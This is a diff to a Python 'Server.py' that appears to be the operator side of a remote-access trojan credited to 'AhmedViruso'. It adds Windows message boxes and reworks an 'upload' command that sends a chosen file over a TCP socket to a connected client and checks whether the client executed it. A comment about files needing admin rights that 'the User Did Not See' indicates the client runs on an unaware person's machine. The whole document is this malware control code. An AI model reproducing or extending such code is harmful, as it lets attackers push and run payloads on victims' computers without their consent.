@@ -1,12 +1,16 @@
 # Python 3
 
 try:
-	import socket,time
+	import socket,time,ctypes
 except:
 	print(" Error Import Libraries")
 	exit()
 
-print(" - By AhmedViruso")
+try:
+	ctypes.windll.user32.MessageBoxW(0, "Programmed By AhmedViruso", "Hello", 0)
+	ctypes.windll.user32.MessageBoxW(0, "If Server.py Suspended Because Something Just Restart It", "Note", 0)
+except:
+	pass
 
 def Create(): # Create Tcp Socket
 
@@ -102,67 +106,65 @@ def SendOrders(Con):
 
         elif(Command == 'upload'):
         	
-            try:
-                    
-                try:
+        	try:
+        		ctypes.windll.user32.MessageBoxW(0, "If You Send File Requires Admin Rights And The User Did Not See It , This Cause to Suspend Client Until Receive Response From User", "Note", 0)
 
-                    Up = input(" - File Path -> ")
-                    Up = Up.replace('"',"")
+        		try:
+        			Up = input(" - File Path -> ")
+        			Up = Up.replace('"',"")
 
-                    with open(Up, "rb") as F:
-                        Data = F.read() # Read File Bytes
+        			with open(Up, "rb") as F:
+        			    Data = F.read() # Read File Bytes
 
-                except:
-                    print(" - File Error")
-                    continue
+        		except:
+        			print(" - File Error")
+        			continue
 
-                Con.send(str.encode(Command))
-                                
-                if(Con.recv(1024).decode("utf-8") == "file"):
-                	
-                        User = input(" - File Extension -> ")
-                        Con.send(str.encode(User))
+        		Con.send(str.encode(Command))
 
-                        Check = Con.recv(1024).decode("utf-8")
+        		if(Con.recv(1024).decode("utf-8") == "file"):
 
-                        if(Check == "errorfile"):
-                            print(" - Error File")
-                            continue
+        			User = input(" - File Extension -> ")
+        			Con.send(str.encode(User))
 
-                        elif(Check == "truefile"):
-                            pass
+        			Check = Con.recv(1024).decode("utf-8")
 
-                        else:
-                            print(" - [1] Undefined Reposnse From Client, Try Again")
-                            continue
+        			if(Check == "errorfile"):
+        				print(" - Error File")
+        				continue
 
-                        Con.sendall(Data) # Send the File
+        			elif(Check == "truefile"):
+        				pass
 
-                        print(" - Wait")
+        			else:
+        				print(" - [1] Undefined Reposnse From Client, Try Again")
+        				continue
 
-                        F.close() # Close The File
+        			Con.sendall(Data) # Send the File
+        			print(" - Wait")
 
-                        Check = Con.recv(1024).decode("utf-8")
+        			F.close() # Close The File
 
-                        if(Check == "executetrue"):
-                            print(" - Done")
+        			Check = Con.recv(1024).decode("utf-8")
 
-                        elif(Check == "executefalse"):
-                            print(" - Error Execute")
-                            continue
+        			if(Check == "executetrue"):
+        				print(" - Done")
 
-                        else:
-                            print(" - [2] Undefined Reposnse From Client , Try Again")
-                            continue
+        			elif(Check == "executefalse"):
+        				print(" - Error Execute")
+        				continue
 
-                else:
-                    print(" - [3] Undefined Reposnse From Client , Try Again")
-                    continue
-                        
-            except:
+        			else:
+        				print(" - [2] Undefined Reposnse From Client , Try Again")
+        				continue
+        				
+        		else:
+        			print(" - [3] Undefined Reposnse From Client , Try Again")
+        			continue
 
-                print(" - Error 2 , Something Is Wrong")
-                continue
+        	except:
+        		print(" - Error 2 , Something Is Wrong")
+        		continue
 
 
 def Main():
